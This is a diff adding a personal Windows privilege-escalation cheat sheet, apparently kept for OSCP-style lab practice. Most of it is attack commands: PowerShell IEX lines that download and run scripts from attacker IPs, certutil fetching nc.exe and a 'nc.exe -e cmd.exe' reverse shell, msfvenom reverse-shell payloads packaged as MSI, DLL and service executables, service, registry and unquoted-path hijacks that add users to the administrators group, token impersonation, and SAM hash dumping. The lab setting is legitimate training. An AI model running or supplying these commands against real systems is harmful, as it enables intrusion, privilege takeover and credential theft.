@@ -1,0 +1,268 @@
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ (very good, has powershell alts, LFI list and transfer options)
+
+** Systen
+systeminfo | findstr /B /C:"OS Version" /C:"System Type"
+hostname
+
+Show hotfixes and patches:
+wmic qfe
+
+List drives:
+wmic logicaldisk
+wmic logicaldisk get caption,description,providername
+
+** User
+whoami /all
+whoami /priv
+whoami /groups
+net user
+net user <username>
+net localgroup
+net localgroup administrators
+
+** Network
+ipconfig /all
+arp -a (ips using the machine)
+netstat -ano (who machine is talking to) (Check internal ports, direct with plink or meterpreter)
+netstat -anpb TCP (see service names, may be high priv)
+
+** Credentials
+findstr /si password *.txt *.ini *.config *.xml (search for word password in files all types)
+dir *.dbx /s (Emails)
+dir proof.txt /s /p /a (search for filename and show hidden files)
+reg query HKLM /f password /t REG_SZ /s
+	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" (Show more info reg entry) (search for 'CurrentPass')
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-file-contents
+Alternate dat stream in windows (like hidden files);
+dir /R (to show in folder)
+more < <FILE_NAME> (to print out)
+
+cmdkey /list (search for keys used in RunAs command)
+
+** Antivirus and firewall
+sc query windefend (service control command check windows defender)
+sc queryex type= service (see all running services)
+netsh advfirewall firewall dump
+netsh firewall show state
+netsh firewall show config (see rules and ports)
+
+** Automated tools
+winPEAS.exe (requires .net 4, can try .bat file), Seatbelt.exe, Watson.exe, SharpUp.exe, Sherlock.ps1, PowerUp.ps1, jaws-enum.ps1
+windows-exploit-wggester.py (local), Metasploit exploit suggester
+run post/multi/recon/local_exploit_suggester (meterpreter)
+
+c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+
+c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.123/Sherlock.ps1') ; Find-AllVulns" (takes a while, looks frozen)
+
+If you have your ps1 file downloaded to the victim machine then run using this
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+** Kernel Exploits
+https://github.com/SecWiki/windows-kernel-exploits
+
+** Port forward
+plink.exe -l root -pw <PASS> -R 445:127.0.0.1:445 <ATTACKER_IP> (expose internal smb 445 port to external user)
+(upload plink.exe to windows, link back to attacker machine, start ssh service on kali and allow root login) (hit enter if stuck when login)
+netstat -ano | grep 445 (check in kali if victim port 445 available)
+winexe -U Administrator%<PASS> //127.0.0.1 "cmd.exe" (login using exposed port 445 from kali machine)(might need to try multiple times)
+
+** Priv esc
+where /R c:\windows bash.exe (search recursively for bash.exe or wsl.exe subsystem linux file)
+wsl whoami
+wsl python -c '<PYTHON_COMMAND_WITH_REVERSE_SHELL>'
+
+getsystem (in meterpreter) 
+(uses 3 techniques, 1: named pipe in memory (less conspicuous), 2: dll to disk (antivirus risk), 3: uses sedebug: looks for root servies and trys to inject)
+
+** RunAs.exe:
+cmdkey /list (shows stored user creds e.g. ACCESS\Administrator)
+C:\Windows\System32\runas.exe /user:<STORED_CREDS_TARGET> /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > root.txt"
+(use runas to run command as admin (stored creds))
+
+** Token impersonation
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges
+common tokens that can be abused:
+•	SeImpersonatePrivilege
+•	SeAssignPrimaryPrivilege
+•	SeTcbPrivilege
+•	SeBackupPrivilege
+•	SeRestorePrivilege
+•	SeCreateTokenPrivilege
+•	SeLoadDriverPrivilege
+•	SeTakeOwnershipPrivilege
+•	SeDebugPrivilege
+
+SeImpersonatePrivilege In meterpreter:
+load incognito
+list_tokens -g (list available impersonate tokens)
+list_tokens -u (list available impersonate tokens)
+impersonate_token "BUILTIN\Administrators" (from list above select to to impersonate)
+migrate ‘pid’
+(set AutoRunScript post/windows/manage/migrate)
+
+
+Potato attack from MSF:
+use exploit/multi/script/web_delivery
+show targets, set target, set payload windows/meterpreter/reverse_tcp 
+(returns code to run and job starts in bg) (run code in normal shell and get session in meterpreter, might need to migrate from x86)
+run post/multi/recon/local_exploit_suggester
+use <ms16_075_exploit>, set LHOST and different LPORT, payload windows/x64/meterpreter/reverse_tcp
+load incognito (in new session, root should show)
+impersonate_token "NT AUTHORITY\SYSTEM"
+
+Hot Potatoe:
+powershell.exe -nop -ep bypass
+Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+net localgroup administrators
+
+** Autoruns and Access checks
+https://tryhackme.com/room/windowsprivescarena
+In RDP: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe (find autoruns)
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\<Autorunning Program>" (see info from program identified above)
+
+For PowerUp (powershell script), right click in folder and choose 'open in cmd'
+powershell -ep bypass
+. .\PowerUp.ps1 (load script)
+Invoke-AllChecks (shows autoruns and config and who can RW to it) 
+(If PS freezes, can add Invoke-AllChecks to end of powerup file to autorun. Use: powershell -ep bypass .\PowerUp.ps1)
+(Create exe in msfvenom and replace autorun program exe file with it) (may need to log in and out to run file)
+
+** Registry Escalation
+Check AlwaysInstallElevated = 1 so msi files can install with high permissions
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+(AlwaysInstallElevated is checked in PowerUp) 
+WriteUserAddMSI (Following powerup, create useradd msi in current dir, run to add user as admin)
+or (without powerup)
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCAL_IP> -f msi -o setup.msi (place in victim machine in /temp)
+msiexec /quiet /qn /i C:\Temp\setup.msi (create reverse shell as admin)
+	or use windows/local/always_install_elevated
+
+** Service Escalation
+powershell -ep bypass
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl (check use has Fullcontrol of services registry, can add exe to service)
+copy /home/kali/mediashare/tools/Source/windows_service.c and modify payload in system()
+cmd.exe /k net localgroup administrators user /add (add as payload to add <user> to admin group when service is ran)
+(compile locally with x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64'))
+Place in /temp on victim machine
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+sc start regsvc
+
+** EXE service escalation
+Check powerup for exe running as service and is writeable/modifiable (or use accesschk.exe, "everyone" and FILE_ACCESS_)
+Replace executable with previous compiled exe that adds user to admin group
+copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc (check user is added with: net localgroup administrators)
+
+** Startup Applications and folder perms
+icacls "C:\Program Files"
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (check startup apps, check for (F) FULL_ACCESS next to current user)
+Generate reverse shell exe and place in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup” (Logout/in to run exe)
+
+** DLL Hijacking (Missing DLLs)
+Check for missing DLLs in writeable dirs, Windows application uses pre-defined search paths to find DLLs and checks these paths in a specific order
+DLLs are shown in PowerUp (after Powershell loaded, run Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll' to generate DLL)
+Or use ProcMon search for NAME NOT FOUND
+copy /home/kali/mediashare/tools/Source/windows_dll.c and modify payload in system()
+x86_64-w64-mingw32-gcc windows_dll.c -shared -o <MISSING_DLL>.dll
+	OR: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=4445 -f dll > wlbsctrl.dll
+Place <MISSING_DLL>.dll in location that will be checked thats writeable (exe folder, system32, system, Windows, current dir, PATH)
+sc stop dllsvc & sc start dllsvc
+
+** Service permission PATH escalation
+accesschk64.exe -wuvc Everyone * (show all services with write acces for Everyone, also in PowerUp)
+accesschk64.exe -wuvc <SERVICE_NAME> (more perm info on service, look for SERVICE_CHANGE_CONFIG)
+sc qc <SERVICE_NAME> (show service info inc. bin path)
+sc config <SERVICE_NAME> binpath= "net localgroup administrators user /add"
+sc start <SERVICE_NAME>
+
+** Unquoted service paths (Path without quotes and has space)
+run regedit, go to HKEY_LOCAL_MACHINE, SYSTEM, CurrentControlSet, services, <SERVICE_NAME> (also shown in PowerUp)
+	or: wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
+"For example: C:\Program File\Unquoted File Path (Add malicious exe called Unquoted.exe inside Program files folder if writeable)
+msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o Unquoted.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.65 LPORT=21 -f exe-service -o Unquoted.exe
+sc start <SERVICE_NAME>
+	On PG: had to restart machine to restart service using: shutdown -r -t 10 && exit
+	
+Revshell: certutil.exe -urlcache -split -f http://192.168.49.79:8082/nc.exe C:/Windows/Temp/nc.exe
+	C:/Windows/Temp/nc.exe 192.168.49.79 80 -e cmd.exe
+
+CVE-2019-1388 Certificate in IE:
+When opening a exe with certificate, view certificate in prompt in IE, choose save-as (ignore error)
+type c:\Windows\System32\*.* then go to cmd.exe in system32, right click and open.
+
+Get SAM from file system (likely from mounted backup):
+C:\Windows\System32\config\ (download SAM, SECURITY and SYSTEM files)
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL (in impacket, run in folder SAM files are downloaded to)
+(hashes may have changed)
+
+Kernel exploit info: (search for vuln name in searchsploit etc)
+eDB   Vuln Name         MS#     2K       XP     2003    2008      Vista      7
+271   Lsasrv.dll     MS04-011  SP2,3,4  SP0,1    -       -        -         -
+350   Util Manager   MS04-019  SP2,3,4  -        -       -        -         -
+351   POSIX          MS04-020  SP4      -        -       -        -         -
+352   Univ lang. UtilMS04-019   -       SP2,3,4  -       -        -         -
+355   Univ lang. UtilMS04-019   -       SP2,3,4  -       -        -         -
+1149  PnP Service    MS05-039  P4       SP2      SP1     -        -         -
+1197  keybd_event    -         all      all      all     -        -         -
+1198  CSRSS          MS05-018  SP3,4    SP1,2    -       -        -         -
+1407  Kernel APC     MS05-055  SP4      -        -       -        -         -
+1911  Mrxsmb.sys     MS06-030  all      SP2      -       -        -         -
+2412  Windows Kernel MS06-049  SP4      -        -       -        -         -
+3220  Print spool    -         -        All      -       -        -         -
+5518  win32k.sys     MS08-025  SP4      SP2      SP1,2   SP0      SP0,1       -
+6705  Churrasco      MS09-012  -        -        All     -        -         -
+6705  Churraskito    -         -        All      All     -        -         -
+21923 Winlogon       -         All      All      -       -        -         -
+11199 KiTrap0D       MS10-015  All      All      All     All      All       All
+14610 Chimichurri    MS10-059  -        -        -       All      All       SP0
+15589 Task Scheduler MS10-092  -        -        -       SP0,1,2  SP1,2     SP0
+18176 AFD.Sys        MS11-080  -        SP3      SP3     -        -         -
+100   RPC DCOM       MS03-026  SP3,4    -        -       -        -         -
+103   RPC2           MS03-039  all (CN) -        -       -        -         -
+109   RPC2           MS03-039  all      -        -       -        -         -
+119   Netapi         MS03-049  SP4      -        -       -        -         -
+3022  ASN.1          MS04-007  SP2,3,4  SP0,1    -       -        -         -
+275   SSL BOF        MS04-011  SP4      ?        -       -        -         -
+295   Lsasarv.dll    MS04-011  SP2,3,4  SP0,1    -       -        -         -
+734   NetDDE BOF     MS04-031  SP2,3,4  SP0,1    -       -        -         -
+1075  Messaging QueueMS05-017  SP3,4    SP0,1    -       -        -         -
+1149  PnP Service    MS05-039  SP4      -        -       -        -         -
+2223  CP             MS06-040  -        SP1      -       -        -         -
+2265  NetIPSRemote   MS06-040  SP0-4    SP0,1    -       -        -         -
+2789  NetPManageIP   MS06-070  SP4      -        -       -        -         -
+7104  Service exec   MS08-067  SP4      SP2,3    SP1,2   SP0      SP0,1     -
+7132  Service exec   MS08-067  SP4      -        SP2     -        -         -
+14674 SRV2.SYS SMB   MS09-050  -       -         -       -        SP1,2     - 
+
+  MS*           HotFix                         OS
+MS16-032     KB3143141    Windows Server 2008 ,7,8,10 Windows Server 2012
+MS16-016        KB3136041    Windows Server 2008, Vista, 7 WebDAV
+MS15-051     KB3057191     Windows Server 2003, Windows Server 2008, Windows 7, Windows 8, Windows 2012
+MS14-058     KB3000061    Windows Server 2003, Windows Server 2008, Windows Server 2012, 7, 8 Win32k.sys
+MS14-040     KB2975684     Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
+MS14-002     KB2914368     Windows XP, Windows Server 2003
+MS13-005     KB2778930    Windows Server 2003, Windows Server 2008, 7, 8,
+MS10-092     KB2305420     Windows Server 2008, 7
+MS10-015     KB977165     Windows Server 2003, Windows Server 2008, 7, XP
+MS14-002     KB2914368    Windows Server 2003, XP
+MS15-061     KB3057839    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
+MS11-080     KB2592799    Windows Server 2003, XP
+MS11-062     KB2566454    Windows Server 2003, XP
+MS15-076     KB3067505    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
+MS16-075     KB3164038    Windows Server 2003, Windows Server 2008, 7, 8, Windows Server 2012
+MS15-010     KB3036220    Windows Server 2003, Windows Server 2008, 7, XP
+MS11-046     KB2503665    Windows Server 2003, Windows Server 2008, 7, XP
+
+MS11-011 (KB2393802)
+MS10-059 (KB982799)
+MS10-021 (KB979683)
+MS11-080 (KB2592799)
+
